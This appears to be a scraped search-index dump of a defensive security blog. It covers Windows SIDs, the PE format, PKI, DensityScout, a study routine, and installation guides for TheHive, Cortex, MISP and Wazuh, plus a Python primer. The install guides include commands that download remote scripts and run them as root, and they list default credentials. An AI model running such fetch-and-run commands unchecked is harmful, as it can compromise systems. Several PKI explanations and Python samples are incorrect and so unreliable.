Name SID/RID Value Identifies Null SID S-1-0-0 A group with no members Everyone S-1-1-0 Generic group that automatically includes all users of the computer Local S-1-2-0 Users who log on physically to terminals Console S-1-2-1 Users who log on to the physical console Network S-1-5-2 A group that includes users logged on through a network connection. Interactive S-1-5-4 A group that includes all users that have logged on interactively. Service S-1-5-6 A group that includes all service logons Anonymous S-1-5-7 A group that includes all anonymous logon sessions Authenticated Users S-1-5-11 A group that includes all authenticated user logons Remote Interactive Logon S-1-5-14 A group that includes all users logged on through terminal services Local System S-1-5-18 A service account used by the system Administrator S-1-5-21-xxxx-500 A user account for the System Administrator. This account is given full control of the system. Guest S-1-5-21-xxxx-501 A built-in guest account used for users without an account (disabled by default) Krbtgt S-1-5-21-xxxx-502 A service account used by the Kerberos KDC Domain Admins S-1-5-21-xxxx-512 A global group of whose members are authorized to administer the domain. Domain Users S-1-5-21-xxxx-513 A global group that includes all domain users by default Domain Guests S-1-5-21-xxxx-514 A global group consisting of the built-in Guest account Domain Computers S-1-5-21-xxxx-515 A global group that includes all clients and servers connected to the domain Administrators S-1-5-32-xxxx-544 A built-in group that is populated with the Administrator and Domain Admin accounts Users S-1-5-32-xxxx-545 A built-in group that contains all authenticated users Guests S-1-5-32-xxxx-546 A built-in group with the default guest account held within Power Users S-1-5-32-xxxx-547 A built-in group that by default has no members unless added through associated group Sources Microsoft - Well Known SIDS" }, { "title": "Windows Portable Executable (PE) File Format", "url": "/posts/Windows_PE_File_Format/", "categories": "General IT and Security, Deep Dives", "tags": "", "date": "2022-09-17 00:00:00 +1000", "snippet": "OverviewThe portable executable file format is a type of format used in 32 and 64bit Windows operating systems and includes items such as object code, DLLs font files and core dumps embedded within in order to execute on a host system. Understanding the PE file format is important when reverse engineering or performing malware analysis on a suspicious executable file, particularly during the manual analysis of a file via a decompiler or debugger.PE File HeaderExecutable files follow a standardized structure called the Common Object File Format (COFF), PE Files are a COFF formatted executable used within Windows Operating Systems, encapsulating formats such as Executable (.exe, .cpl, .sys, etc), object code and DLLs. The PE file format contains integral information required by the Windows OS to efficiently load and execute the file.  Understanding the different components of a PE file is fundamental to performing malware analysis.The PE file format contains a data structure that allows the Operating System to identify the required components required to execute the file, including such information as metadata covering file type, import and export functions, memory addresses and others.The sections area of the PE format contains several components of which are Important to understand for malware analysis, with the mostly commonly encountered being: .text: Contains the executable component of the program that the operating system will execute. This should be the only section with execute privileges and to contain resident code. .rdata: Contains the import and export information. It can also be used to store other read-only data used by the program. Import and export sections can be subdivided into .idata and .edata respectively. .data: Contains the global data required by the program. .rsrc: Contains the resources used by the application such as icons, images, menus and strings.Each of the sections above have their own header in which section sizes, both on disk and virtual, are listed. Typically, the size should be relatively close when investigating files, an exception is the .data section which commonly has a larger mismatch in size variables. Size discrepancies can be indicative of packed software as the packing/unpacking code will be loaded in memory.The .rsrc section can at time bear fruitful information. Using applications that can parse the .rsrc section allows an analyst to access and identify embedded DLLs, images, executables, etc of which may be used by the suspicious binary.Linked Libraries and FunctionsIdentification of an executables linked libraries, either statically linked, at runtime or dynamically, provides a good understanding of the functionality of the malware. Shared libraries allow multiple programs to share common functions without the need for the functionality to be coded from scratch. Linked libraries are listed within the PE Header as Imports. Statically Linked Libraries: The least common method which involved importing the entire library into the programs own code. Runtime Library Linkage: Commonly used by malware, runtime linkage only loads the library when it is required. There are several Windows functions including ‘LoadLibrary’ and ‘GetProcAddress’ that allow any function in any library to be used which makes static analysis of these files difficult as the exact functions and imports are not listed. Dynamically Linked Libraries: These provide the best method of understanding what a programs functions are as the import libraries are loaded upon execution and often the exact functions called are listed within the PE Header. (The image to the left depicts an example, two libraries loaded with individual imports listed).Exported FunctionsExecutables rarely export function by themselves, however if analyzing a suspicious DLL it is important to check the available exports. Exports are functions that can be called upon for use by an importing application. Normal software typically follows a standardized naming convention as displayed in the above Kernel32.dll functions, however malware authors can and do often attempt to mislead analysts by naming the functions incorrectly or in a meaningless manner.Sources Microsoft - PE Format Microsfot - Win32 API Open RCE - PE Format Dandy Life - PE File Format Practical Malware Analysis" }, { "title": "Public-Key Infrastructure (PKI)", "url": "/posts/PKI/", "categories": "General IT and Security, Deep Dives", "tags": "pki, digital certificate, cryptography", "date": "2022-09-17 00:00:00 +1000", "snippet": "OverviewPKI implements two cryptographic methods to encrypt and decrypt traffic; symmetric and asymmetric cryptography and hashing. The purpose of establishing PKI encryption for network communications is to provide strong authentication schemes to protect data confidentiality and integrity, two of the core pillars of the CIA triad for ensuring that an environment is secured. Being a hybrid cryptographic method in the fact that PKI utilizes symmetric and asymmetric cryptography and hashing, it can harness the advantages of each to provide a robust, fast and effective encryption method.KeysThe hybrid cryptographic implementation harnessed by PKI leverages the below; Symmetric: Utilizes a single key shared between two parties to encrypt and decrypt data. Faster, however less secure than asymmetric cryptography. Asymmetric: Consists of a private and public key pair, both are mathematically related however one cannot be derived from the other. Data is encrypted with the originators private key and recipients public key, with only the holder of the recipients private key being able to decrypt the data. More secure, however slower than symmetric cryptography. Hybrid: Generates a session key based on the symmetric cryptography method to validate communication between two parties and encrypts that session key using asymmetric cryptography, the originator encrypting the key with their private key and the recipients public key. Once the recipient decrypts the session key using their private key, the session key is then used securely to transfer encrypted data.Algorithms, Hashing, and StandardsSymmetric and asymmetric employ different cryptographic algorithms to encrypt data, with certain algorithms develops to be used for each method and are not compatible with each other. The examples listed below are the current common implementations and do not list previous cryptographic algorithms that have been replaced. Symmetric: Advanced Encryption Standard (AES) - 128-bit block cypher. Contains keys of sizes: 128, 192, or 256 bits. Asymmetric: Rivest-Shamir-Adleman Standard (RSA) - Contains keys of sizes: 1024, 2048, or 4096 bits. Hashing: There are numerous amounts of different hashing algorithms that can be employed, however the most common for use in encrypting network data and Digital Certificates are: MD5: Message-Digest Algorithm, 128-bit hash value SHA-1: Secure Hash Algorithm 1, 160-bit hash value SHA-2: Secure Hash Algorithm 2, 224, 256, 384, or 512-bit hash value SHA-3: Secure Hash Algorithm 3, 224, 256, 384, or 512-bit hash value Standards: There are a number of different standards that PKI implementations can follow, however the most common and primary standard is the below. Other standard tend to be more industry or vendor specific: X.509: This standard defines the format of public key certificates that are used in many internet protocols including SSL/TLS, digital signatures and certificates. Digital CertificatesDigital certificates are a large part of PKI. Digital certificates are a logical file formatted upon the X.509 standard and include information pertaining to an originators validity. Implementations of digital certificates vary, from digitally signing emails to ensure non-repudiation, code signing, and probably most visible in day-to-day usage is the use of digital certificates in SSL/TLS encryption. The details stored within a digital certificate vary, however some of the more useful are: Originators public key Originators identification details Issuing authority of the certificate (CA) Valid dates of useBeing a logical file, there are a number of different filetypes that will be encountered, such as; .pem: Privacy Enhanced Email .cer, .crt, .der: Certificate files .p12: PKCS#12. Usually contains X.509 certificates, public, and private keys and is password protected. .csr: Certificate Signing Request. Contains information submitted by an originator requesting a certificate.Digital certificates are issued by Certificate Authorities (CA), who are responsible for proving the authenticity of the individual or organization of whom issued the request for the certificate. There are numerous trusted commercial CAs, such as Digicert, Let Encrypt, and Comodo to name a few. Organization can also implement their own internal CA for certificates being used within the network boundaries of their environment.Generating a Private Key and CSR with OpenSSH v3OpenSSL are a project team who develop and maintain software that allows the creation of general-purpose PKI keys and certificates. The below example depicts the steps required to create a RSA 2048-bit private key and CSR file. Download the OpenSSL software from the OpenSSL Github Repo, download and installation guides are available for different Operating Systems. Generate a CSR and private key in order to apply for a CA signed certificate, required parameters will be prompted during the execution of the command, including: Country Name State or Province Name Locality Name Organization Name Organizational Unit Name Common Name Email Address A Challenge Password openssl req -newkey rsa:2048 -noenc -keyout &lt;private key name&gt;.key -out &lt;CSR name&gt;.csr Generating a Private Key and Self-Signed Certificate with OpenSSH V3OpenSSL also allows users to create self-signed certificates that are intended for use within a private network, having not been signed by a validated CA. The below example depicts the steps required to create a RSA 2048-bit private key and CRT file that is valid for 825 days. Download the OpenSSL software from the OpenSSL Github Repo, download and installation guides are available for different Operating Systems. Generate a private key and generate a certificate openssl req -newkey rsa:2048 -noenc -keyout &lt;private key name&gt;.key -x509 -days 825 -out &lt;certificate name&gt;.crt Sources Wikipedia - Public-Key Cryptography DigiCert - What is PKI? ITU - Public-Key and Attribute Certificate Frameworks SSL - What is a Certificate Authority? WPMDEV - 2022 SSL Certificate Authorities Reviewed OpenSSL SSL Labs - SSL and TLS Deployment Best Practices" }, { "title": "DensityScout", "url": "/posts/DFIR_Tools_MA_DensityScout/", "categories": "DFIR Tools, Malware and File Analysis", "tags": "densityscout, defence evasion (TA0005), obfuscated files or information (T1027)", "date": "2022-09-17 00:00:00 +1000", "snippet": "OverviewThis tool calculates density (entropy) for files of any file-system-path to finally output an accordingly descending ordered list. This makes it possible to quickly find (even unknown) malware on a potentially infected Microsoft Windows driven machine.Entropy is used to represent a measurement of code density. Results with higher entropy indicate that a code is randomized, and no meaningful patterns can be identified. Low entropy results are likely indicative of normal or unpacked files. Usually, Microsoft Windows executables are not packed or encrypted therefore any abnormalities detected by running the DensityScout should be further investigated. Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique MITRE ATT&amp;CK Sub-Technique DensityScout Build 45 Defence Evasion Obfuscated Files or Information Software Packing DensityScout HelpDensityScout (Build 45)Author: Christian Wojner, CERT.atSyntax: densityscout [options] file_or_directoryoptions: -a .............. Show errors and empties, too -d .............. Just output data (Format: density|path) -l density ...... Just files with density lower than the given value -g density ...... Just files with density greater than the given value -n number ....... Maximum number of lines to print -m mode ......... Mode ABS (default) or CHI (for filesize &gt; 100 Kb) -o file ......... File to write output to -p density ...... Immediately print if lower than the given density -P density ...... Immediately print if greater than the given density -r .............. Walk recursively -s suffix(es) ... Filetype(s) (i.e.: dll or dll,exe,...) -S suffix(es) ... Filetype(s) to ignore (i.e.: dll or dll,exe) -pe ............. Include all portable executables by magic number -PE ............. Ignore all portable executables by magic numberNote: Packed and/or encrypted data usually has a much higher density than normal data (like text or executable binaries).Modes: ABS ... Computes the average distance from the ideal quantity for each byte-state according to the overall byte-quantity of the evaluated file. Typical ABS-density for a packed file: &lt; 0.1 Typical ABS-density for a normal file: &gt; 0.9 CHI ... Just the same as ABS but actually squaring each distance. Typical CHI-density for a packed file: &lt; 100.0 Typical CHI-density for a normal file: &gt; 1000.0InstructionsSearch the Windows System32 Directorydensityscout -pe -p 0.1 -o results.txt c:\\Windows\\System32 -pe Searches for files with magic number “MZ” representing a PE file. -p 0.1 Instructs DensityScout to highlight files identified with a density below 0.1 on the command line screen. This is a quick reference to display data prior to the tools function completing. -o results.txt Writes the full results set to a .txt file, matches from the -p switch above will still be written to STDOUT. -r Omitted from the above example, however when included searches the directory specified recursively. Listing the directory without -r only searches that directory without checking subdirectories.OutputSources YouTube - Aether Lab - Quick Search for Malware with DensityScout SANS Blog - Finding Unknown Malware with DensityScout" }, { "title": "Study Methodology", "url": "/posts/Study_Methodology/", "categories": "General IT and Security, Training", "tags": "", "date": "2022-09-16 00:00:00 +1000", "snippet": "OverviewThere are millions (don’t quote me on that) of courses and certifications available within he IT and Cyber Security realm with new ones popping up just as frequently as the sun rises. No matter the certification, applying a study methodology I find is an essential piece in not only successfully obtaining the titled certification, but actually understanding the material and being able to practically apply it and build on the information that you learn. Some may have a tried and true method for approaching certification exams and some may still be searching for guidance on how to proceed, which is why I’ve dropped this post. This is how I personally approach exams and if it can help just a single person, im over the deathstar!RoutineRoutine is essential to effectively learn and study, until such time that we can all download the course material directly into our built-in brain SD cards (please Elon Musk). This is how I break it down.Daily Schedule: Schedule yourself time throughout the day that is dedicated solely to study! I sectioned my learning plan into chapters and topics, scheduling 1-2hrs per day, Monday-Friday, to cover that said chapter/topic. It doesn’t have to be in full blocks, 20mins here and 30mins there until you can get that section complete. Isolation: Be in the ZONE! Headphones on, noise cancelling to max and let your partner know that this time is dedicated to study and focus. Set your calendar to remind you 15mins prior to your scheduled study allotment to prepare yourself and others around you. It’s not an excuse to get out of housework, believe me i’ve tried. Method: The method in which I prefer is to firstly read the topic material from the physical book or transcript if the course is delivered through video. Have a notebook or live document (I use Atlassian Confluence which has a free hosted tier. Having it in the cloud allows you to access it via you phone when away from the computer!) at the ready and bullet point notes of interest, nothing extreme and write them in your own understanding. The day after covering a topic is the day you get into the video material, watch the corresponding sections for the material you read, return to the notes to add any additional context or diagrams. Rinse and repeat for things that you cannot confidently describe in your own way. Weekly Monday: I hate them, I use Mondays to schedule my week, add calendar entries for the specific topics/chapters you aim to cover throughout the week ahead. Review the previous weeks learning outcomes. If the material your studying has practice quizzes or knowledge assessments this is the day to attempt them. Rest of the Week: See Daily, and repeat. Exam Week (7 days out) Planning: You should not be finishing a first pass of reading 7 days prior to sitting the exam. Plan your schedule to give yourself a spare week before the exam date. During this spare week, don’t over-do it! Have some time off, drown your partner or pet or parents or friends with the topics you’ve learnt and how it can benefit them in everyday situations, they’ll love it! Practice Exams: My strategy has always been to conduct a practice exam the day after finishing the course material, learn from your failings the during this initial attempt and put in some additional research (by research I mean consult Mr. Google). As for a second practice exam, do it the day before your exam, works a charm! Stress: Honestly, stress will be your downfall. It’s only a certification exam, take a breath! if you’re unsuccessful, you re-sit it… Nothing is stopping you!" }, { "title": "TheHive4, Cortex, and MISP Server Installation", "url": "/posts/The_Hive_Install/", "categories": "General IT and Security, Engineering", "tags": "the hive, cortex, misp", "date": "2022-09-13 00:00:00 +1000", "snippet": "Overview“TheHive is a scalable 3-in-1 open source and free Security Incident Response Platform designed to make life easier for SOCs, CSIRTs, CERTs and any information security practitioner dealing with security incidents that need to be investigated and acted upon swiftly. It is the perfect companion to MISP. You can synchronize it with one or multiple MISP instances to start investigations out of MISP events. You can also export an investigation’s results as a MISP event to help your peers detect and react to attacks you’ve dealt with. Additionally, when TheHive is used in conjunction with Cortex, security analysts and researchers can easily analyze tens if not hundred of observables.” The HiveThis post will run through the steps involved in the installation and configuration of The Hive 4.x and Cortex on a single server deployment. Additionally, MISP will also be installed on the same server.Hardware Dependencies Users CPU RAM Storage &lt;3 2vCPU 4-8GB 50GB &lt;10 4vCPU 8-16B 100GB &gt;10 8vCPU 16-32GB 200GB Installing TheHive4 TheHive requires Java OpenJDK version 8 or 11 (LTS) in order to load, although 8 is required to load the Cassandra nodes in the following database setup apt-get install -y openjdk-8-jre-headlessecho JAVA_HOME=\"/usr/lib/jvm/java-8-openjdk-amd64\" &gt;&gt; /etc/environmentexport JAVA_HOME=\"/usr/lib/jvm/java-8-openjdk-amd64\" Install the Apache Cassandra database, note that version 3.11.x is supported by TheHive with its repo added to the sources list. Cassandra is the backend database in which TheHive will write to. curl -fsSL https://www.apache.org/dist/cassandra/KEYS | sudo apt-key add -echo \"deb http://www.apache.org/dist/cassandra/debian 311x main\" | sudo tee -a /etc/apt/sources.list.d/cassandra.sources.listsudo apt updatesudo apt install cassandracqlsh localhost 9042cqlsh&gt; UPDATE system.local SET cluster_name = 'thp' where key='local';nodetool flush Configure Cassandra by amending the cluster name and cassandra.yaml file. For this post, a single node is being created so the host IP address is the only parameter required in the IP options. # /etc/cassandra/cassandra.yamlcluster_name: 'thp'listen_address: 'xx.xx.xx.xx' # address for nodesrpc_address: 'xx.xx.xx.xx' # address for clientsseed_provider: - class_name: org.apache.cassandra.locator.SimpleSeedProvider parameters: # Ex: \"&lt;ip1&gt;,&lt;ip2&gt;,&lt;ip3&gt;\" - seeds: 'xx.xx.xx.xx' # self for the first nodedata_file_directories: - '/var/lib/cassandra/data'commitlog_directory: '/var/lib/cassandra/commitlog'saved_caches_directory: '/var/lib/cassandra/saved_caches'hints_directory: - '/var/lib/cassandra/hints' Install TheHive via APT package Create a local file storage path for TheHive installation mkdir -p /opt/thp/thehive/filescurl https://raw.githubusercontent.com/TheHive-Project/TheHive/master/PGP-PUBLIC-KEY | sudo apt-key add -echo 'deb https://deb.thehive-project.org release main' | sudo tee -a /etc/apt/sources.list.d/thehive-project.listsudo apt-get updatesudo apt-get install thehive4 Create an indexing directory for TheHive and change permissions. mkdir /opt/thp/thehive/indexchown -R thehive:thehive /opt/thp/thehive/indexchown -R thehive:thehive /opt/thp/thehive/files This may already be set during the installation process, however if not follow the steps to add the directories and change permissions. There should be 3 directories with all permissions set to thehive:thehive (databse, files, index). Configure etc/thehive/application.conf db { provider: janusgraph janusgraph { storage { backend: cql hostname: [\"127.0.0.1\"] # seed node ip addresses cql { cluster-name: thp # cluster name keyspace: thehive # name of the keyspace } } } } # Storage configuration storage { provider = localfs localfs.location = /opt/thp/thehive/files } Once complete, change ownership permissions for the /opt/thp/thehive/files directory Start TheHive service service thehive start Once started, the hive can be access via the web-gui http://YOUR_SERVER_ADDRESS:9000/ The default admin user is admin@thehive.local with password secret. It is recommended to change the default password. Installing CortexCortex allows the automatic analysis of observables stored with a TheHive case. Examples are such things as IP reputation checks, VirusTotal checks, and intelligence scanning for IOCs. The developers behind TheHive created and maintain Cortex, making the linkage between the two seamless. Cortex works via API calls to various external sources. The following example outlines the steps to install and configure Cortex on the same server running TheHive. Cortex requires Elasticsearch v7.x prior to installation, therefore the initial step is to add the Elasticsearch repo to the sources list and install the package. wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -echo \"deb https://artifacts.elastic.co/packages/7.x/apt stable main\" | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.listsudo apt install apt-transport-httpssudo apt update &amp;&amp; sudo apt install elasticsearch Once the package has installed, configure the elasticsearch.yml file accordingly. http.host: &lt;IP ADDR&gt;cluster.name: hivethread_pool.search.queue_size: 100000 Once edited, start the Elasticsearch service. sudo systemctl enable elasticsearch.servicesudo systemctl start elasticsearch.service Install Cortex via APT package TheHive repo should already be added to the APT sources list, however if not it can be added using the commands displayed. If already added, simply run the cortex install command. curl https://raw.githubusercontent.com/TheHive-Project/TheHive/master/PGP-PUBLIC-KEY | sudo apt-key add -echo 'deb https://deb.thehive-project.org release main' | sudo tee -a /etc/apt/sources.list.d/thehive-project.listsudo apt-get updatesudo apt-get install cortex Configure Cortex Create the Cortex secret key and apply it to the /etc/cortex/application.conf file. Amend the Elasticsearch IP address play.http.secret.key=\"$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1)\" ## ElasticSearch search { # Name of the index index = cortex # ElasticSearch instance address. uri = \"http://&lt;IP ADDR&gt;:9200\" Restart the Cortex service sudo systemctl enable cortexsudo service cortex start Once started, the hive can be access via the web-gui http://YOUR_SERVER_ADDRESS:9001/ Set an admin username and password Installing and Configuring Cotex Analyzers and Responders Install pre-requisite python packages sudo apt-get install -y --no-install-recommends python2.7-dev python3-pip python3-dev ssdeep libfuzzy-dev libfuzzy2 libimage-exiftool-perl libmagic1 build-essential git libssl-devwget https://bootstrap.pypa.io/pip/2.7/get-pip.py python2 get-pip.py sudo pip install -U pip setuptools &amp;&amp; sudo pip3 install -U pip setuptools Clone GibHub repo containing pre-build analyzers and responders cd /opt/cortex/git clone https://github.com/TheHive-Project/Cortex-Analyzers Install required packages for analyzers and responders for I in $(find Cortex-Analyzers -name 'requirements.txt'); do sudo -H pip2 install -r $I; done &amp;&amp; \\for I in $(find Cortex-Analyzers -name 'requirements.txt'); do sudo -H pip3 install -r $I || true; done Add directory to application.conf /path/to/directory/analyzer /path/to/directory/responder Installing MISP“A threat intelligence platform for sharing, storing and correlating Indicators of Compromise of targeted attacks, threat intelligence, financial fraud information, vulnerability information or even counter-terrorism information. Discover how MISP is used today in multiple organizations. Not only to store, share, collaborate on cyber security indicators, malware analysis, but also to use the IoCs and information to detect and prevent attacks, frauds or threats against ICT infrastructures, organizations or people.” MISP As this instance of MISP is being installed on the same server hosting TheHive and Cortex, increase the memory assigned to the server by at least an additional 4GB of RAM and an adequate level of storage (100GB). Download the install script provided by the team over at MISP and run the script to begin the install. The install should largely be unattended, however there may be a popup indicating that a user account ‘misp’ needs to be created, enter ‘y’ to accept this. Done!wget -O /tmp/INSTALL.sh https://raw.githubusercontent.com/MISP/MISP/2.4/INSTALL/INSTALL.shbash /tmp/INSTALL.sh -ASources TheHive Project Documentation TheHive, Cortex, and MISP Cortex Guide" }, { "title": "Installing and Configuring Wazuh EDR", "url": "/posts/Installing_Wazuh/", "categories": "General IT and Security, Engineering", "tags": "wazuh", "date": "2022-09-13 00:00:00 +1000", "snippet": "OverviewWazuh is a security platform that provides unified XDR and SIEM protection for endpoints and cloud workloads. The solution is composed of a single universal agent and three central components: the Wazuh server, the Wazuh indexer, and the Wazuh dashboard.This post will run through the steps involved in the installation and configuration of the server-side components on a single server instance in order to begin ingesting events from agents. The following stages and requirements imply that all of these components are installed on the single-node server and will vary if configuring Wazuh is a distributed deployment.Wazuh is free and open source. Its components abide by the GNU General Public License, version 2, and the Apache License, Version 2.0 (ALv2).Hardware and OS Dependencies Agents CPU RAM Storage (90 Days) 1-25 4 vCPU 8GB 50GB 25-50 8 vCPU 8GB 100GB 50-100 8 vCPU 8GB 200GB For monitoring over 100 agents, a distributed deployment is recommended. OS Version AWS Amazon Linux 2 Red Hat Enterprise Linux 7, 8, 9 CentOS 7,8 Ubuntu 16.04, 18.04, 20.04, 22.04 Exposed Ports Port Use 1514-1515 Wazuh TCP (Agent enrollment and communication) 514 Wazuh UDP (SYSLOG) 55000 Wazuh API 9200 Wazuh indexer HTTPS (Elasticsearch) 443 Wazuh dashboard HTTPS Installing Wazuh 4.3.6 on Ubuntu 20.04 Download and execute the pre-built installation wizard provided by Wazuh. This will automatically run through the installation of pre-requisite packages, Elasticsearch (indexer, Kibana, filebeat) and Wazuh server setup and configuration Once the installation is complete, initial admin credentials will be displayed to the terminal. Make sure they are noted down as they are required to access the web interface in the following step. curl -sO https://packages.wazuh.com/4.3/wazuh-install.sh &amp;&amp; sudo bash ./wazuh-install.sh -a Access the Wazuh web interface at https://&lt;wazuh-dashboard-ip/ and your credentials from Step 1. Username: admin Password: %%%%%%%%% Communication between the web interface and backend is via HTTPS by default. However, the API accounts created during the installation utilize default credentials and should be changed. There are two main accounts used which required modification via the Wazuh API console: wazuh wazuh-wui Changing the wazuh-wui user password will impede the Wazuh UI. The Wazuh configuration file accordingly with the new credentials. /usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml GET /security/users PUT /security/users/# { \"password\": \"@BC1\" } ConfigurationsAdding Agents to WazuhThe Wazuh agent is deployed to hosts in order to monitor various artifacts and report the telemetry back to the Wazuh server in near real time. Key features of the agent include: Log Collection System Inventory Active Response Command Execution Malware Detection File Integrity Monitoring (FIM) Cloud Security Security Configuration Assessment (SCA) Container Security Ports 1514-1515 TCP must be open on the firewall to allow Wazuh agent enrollment and connection to the Wazuh ManagerWindows Agents Choose Windows as the Operating System Enter the Wazuh-Manager IP address or FQDN Assign the agent to a group (can be assigned to default if no groups exist) Execute the PowerShell script supplied on the target host (required administrative privileges) Once installed, start the agent via PowerShell. After which, the agent should be displayed via the Agents menu on the Wazuh dashboard. NET START WazuhSvc Ubuntu Agents Choose Ubuntu as the Operating System Choose the correct architecture, in this example ‘x86_64’ to indicate Ubuntu is running on a AMD 64 architecture. Enter the Wazuh-Manager IP address or FQDN Assign the agent to a group (can be assigned to default if no groups exist) Execute the bash command supplied on the target host Once installed, start the agent using the below bash command. After which, the agent should be displayed via the Agents menu on the Wazuh dashboard. sudo systemctl daemon-reloadsudo systemctl enable wazuh-agentsudo systemctl start wazuh-agent Adding Integrations to WazuhWazuh integrations are configured on the Wazuh server ossec.conf file, located at /var/ossec/etc/ on the managerSlack Add the integration configuration code to the ossec.conf file under the &lt;ossec_config&gt; block, also consider altering the &lt;level&gt; field to filter which events to trigger slack notifications for, see the block quote for further information regarding event level thresholds. &lt;integration&gt; &lt;name&gt;slack&lt;/name&gt; &lt;hook_url&gt;https://hooks.slack.com/services/...&lt;/hook_url&gt; &lt;!-- Replace with your Slack hook URL --&gt; &lt;alert_format&gt;json&lt;/alert_format&gt; &lt;level&gt;%&lt;/level&gt;&lt;/integration&gt; After saving the configuration, restart the Wazuh-Manager service sudo systemctl restart wazuh-manager The default alert threshold is set to 3 - Successful/Authorized events. This will cause a lot of unnecessary alerts to be generated. Changing the threshold to 6 - Low relevance attack can assist in limiting noise. The Rules Classification table describes each alert level from 0 - 16.Sources Wazuh Wazuh - Defining an Alert Level Threshold" }, { "title": "Python Overview", "url": "/posts/Python_Overview/", "categories": "General IT and Security, Programming", "tags": "Python", "date": "2022-09-12 00:00:00 +1000", "snippet": "Python is an easy to understand, interpreted programming language that is commonly used across the cybersecurity community.Data TypesIntegers and StringsIntegers are set without quotation and can also include mathematical operators (+-/*). Strings are required to be wrapped in quotation marks (singular (‘) or double(“)) however cannot contain special characters unless they are explicitly escaped using a backslash (). Multi line strings can be used instead of escaping characters (‘’’) and can also carry the single string to multiple lines.a = 10aa = a * 2b = \"string\"bb = \"Escaping \\\"special characters using backslash\\\"\"c = '''Multi-line stringsor strings that contain special characters \"can be used like this\"'''Strings and Integers can look similar to humans, for example the string ‘10’ and integer 10, however are completely different when being interpreted by a computer. Python interrupts user input as strings, therefore if the input is required to be parsed as an integer or other value they will need to be converted.a = '10'converted_a = int(a)b = '10.5'converted_b = float(b)Empty ValuesIn Python, an empty value is referred to as ‘None’. Its important to understand that the value None is different than a value of 0. These are used to create a variable without assigning a value.a = NoneListsA list is a data type that can contain more than one value and are created using the square bracket ([). Entries inside of a list are referred to an indexes and begin with the first entry at index 0. Lists are modifiable, with indexes being able to changed. Lists can contain any values, including other lists.d = ['darkcybe', 'security']mylist = ['one', 2, 'three' 4]converged = [[1, 2, 3, 4], ['one', 'two', 'three', 'four']]Calling a specific index is done by its index number, as in the example below where we want to return ‘security’ from the d list above. In the case of nested lists, such as the ‘converged’ list, two indexes are required; the first being the list index, and the second the value index. An example is show below of calling the value ‘three; from the nested list.d[1]converged[1][2]Lists can be modified using methods. Methods are similar to function in which they allow certain actions to be taken on an object. Some of the commonly used methods relating to lists can be found here Data Structures . Method Description Example .append Add an item to the end of a list converged.append('five') .inset Insert an item to a specific index, the argument consists of (index, value) mylist.insert(2, 'five') .remove Removes the first object equal to the argument value d.remove('security') .pop Removes an item from a specific index d.remove([1]) .clear Remove all items from a list d.clear() TuplesTuples are similar to lists in construction, replacing the square bracket with a round bracket ((). However, unlike the indexes of a list which are able to be modified, indexes inside of a tuple are static and cannot be changed.3 = ('darkcybesec', 'security blog')RangesRanges represent an immutable sequence of numbers and is commonly used for looping a specific number of times in for loops. Ranges can accept two arguments as depicted in the below example. The first example depicts a ‘stop’ argument, creating a list with 10 indexes. The second involves three arguments; start, stop and step. Start is the beginning of the count, stop the finish, and step being the increment in which the values are counted.list(range(10)) # 0, 1, 2, 3, 4, 5, 6, 7, 8, 9list2(range(0, 50, 5)) # 0, 5, 10, 15, 20...DictionariesDictionaries are similar to lists, however include pairs of data, a key and a value. Dictionaries can hold anything, numbers, strings, a mix and even lists or nested dictionaries. Unlike lists and tuples where values are called via index, dictionaries do not contain index values and storage of key-value pairs is random. To call a value or pair within a dictionary, they are accessed via the key.protocols = {'HTTP': 80, 'HTTPS': 443, 'FTP': 21, 'SSH': 22}traffic = {'Allowed': ['HTTP', 'HTTPS'], 'Blocked': ['FTP', 'SSH']}contacts = {\"number\":2, \"students\": [{\"name\":\"Harry Potter\", \"email\":\"hpotter@gmail.com\"}, {\"name\":\"Ronald Weasley\", \"email\":\"rweasley@gmail.com\"}]}Dictionaries can be modified using methods, some of the commonly used methods relating to dictionaries can be found at the Python Dictionary Methods by W3Schools. Method Description Example clear() Removes all the elements from the dictionary protocols.clear() fromkeys() Returns a dictionary with the specified keys and value (value is optional) x = ('HTTP', 'HTTPS') protocols = dict.fromkeys(x) get() Returns the value of the specified key protocols.get('SSH') keys() Returns a list containing the dictionary’s keys protocols.keys() pop() Removes the element with the specified key protocols.pop('SSH') popitem() Removes the last inserted key-value pair protocols.popitem() setdefault() Returns the value of the specified key. If the key does not exist: insert the key, with the specified value protocols.setdefault('SMB') protocols.setdefault('ELASTICSEARCH', 9200) update() Updates the dictionary with the specified key-value pairs protocols.update({'SYSLOG': 514}) values() Returns a list of all the values in the dictionary protocols.values() FunctionsFunctions are pre-compiled instructions that can be executed to perform certain actions. Python contains a set of built-in functions, however they can be extended by importing modules. In Python, defining a function is done using the ‘def’ keyword. Functions are called by entering the function name followed by a set of parenthesis, any arguments that are to be passed to the function reside within the parenthesis.Standard FunctionsSome of the built-in and commonly used functions that exist in Python are listed below, a more through list of examples can be found atwithin the Python Documentation for Built-in Functions. Method Description Example print() Prints an argument to STDOUT print(\"darkcybe\") int() Returns an integer number. If a float is passed as an argument, the decimal will be removed. int(10.9) float() Returns a floating point number float(99.9) str() Returns a string object str(variable) input() Reads user input \\n drops the terminal input to the next line input(\"What is your name?\"\\n) Defining FunctionsFunctions can be created to perform and repeat code blocks. To do this, the keyword ‘def’ for define, is used to create a function. The below example shows the process of creating and calling a defined function that prints a customized greeting to the terminal.Note that the flow of execution through the program does not execute the function until it is called. The variable ‘name’ within the defined function only resides within the function itself and cannot be called, this is referred to as local scope. Typical variables such as ‘input_name’ can be referenced throughout the code and is known as a global variable.def greeting(name): print('Hello', name)input_name = input('Enter your name: \\n')greeting(input_name)Defining functions structures code and allows for better code reuse. The below example shows a simple dice rolling game that contains two functions; roll_dice which uses the random module to generate two random numbers (simulating two dice being rolled), and the play_game function which is the main function to initiate the game. At the very bottom, the play_game function is called which executes the code.import randomdef roll_dice(): dice_total = random.randint(1,6) + random.randint(1,6) return dice_totaldef play_game(): player1 = input(\"Enter Player 1's name: \") player2 = input(\"Enter Player 2's name: \") roll1 = roll_dice() roll2 = roll_dice() print(player1, 'rolled', roll1) print(player2, 'rolled', roll2) if roll1 &gt; roll2: print(player1, 'Wins!') elif roll1 &lt; roll2: print(player2, 'Wins!') else: print('Tie')play_game()Modules/Libraries/PackagesA module in Python is a way of providing useful code to be used by another program, containing functions 